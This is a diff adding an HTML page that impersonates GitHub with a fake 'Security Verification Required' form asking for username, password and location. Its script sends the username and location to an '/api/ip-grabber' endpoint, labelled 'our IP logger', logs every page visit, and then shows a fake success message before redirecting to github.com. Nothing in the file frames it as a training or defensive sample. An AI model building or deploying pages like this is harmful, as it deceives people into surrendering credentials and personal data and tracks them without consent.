@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GitHub Security Verification</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+            background: #0d1117; 
+            color: #c9d1d9; 
+            max-width: 400px; 
+            margin: 100px auto; 
+            padding: 20px;
+        }
+        .login-box { 
+            background: #161b22; 
+            padding: 30px; 
+            border-radius: 6px; 
+            border: 1px solid #30363d;
+        }
+        .github-logo { 
+            text-align: center; 
+            font-size: 24px; 
+            margin-bottom: 20px; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 8px 0; 
+            background: #0d1117; 
+            border: 1px solid #30363d; 
+            border-radius: 6px; 
+            color: white; 
+            box-sizing: border-box;
+        }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background: #238636; 
+            border: none; 
+            border-radius: 6px; 
+            color: white; 
+            font-weight: bold; 
+            margin-top: 10px; 
+            cursor: pointer;
+        }
+        button:hover { background: #2ea043; }
+        .footer { 
+            text-align: center; 
+            margin-top: 20px; 
+            color: #8b949e; 
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="github-logo">🐙 GitHub</div>
+        <h3>Security Verification Required</h3>
+        <p>Please verify your identity to continue:</p>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="GitHub Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <input type="text" id="location" placeholder="Current Location (Optional)">
+            <button type="submit">Verify Identity</button>
+        </form>
+        
+        <div class="footer">
+            🔒 Protecting your account security
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const location = document.getElementById('location').value;
+            
+            // Send data to our IP logger
+            fetch(`/api/ip-grabber?username=${encodeURIComponent(username)}&location=${encodeURIComponent(location)}&custom=LoginAttempt`)
+                .then(() => {
+                    // Show fake success message
+                    alert('Identity verified successfully! Redirecting...');
+                    setTimeout(() => {
+                        window.location.href = 'https://github.com/security';
+                    }, 2000);
+                })
+                .catch(() => {
+                    alert('Verification completed. Redirecting...');
+                    window.location.href = 'https://github.com';
+                });
+        });
+        
+        // Also log page view without form submission
+        fetch('/api/ip-grabber?username=PageVisitor&location=LandingPage&custom=PageView');
+    </script>
+</body>
+</html>
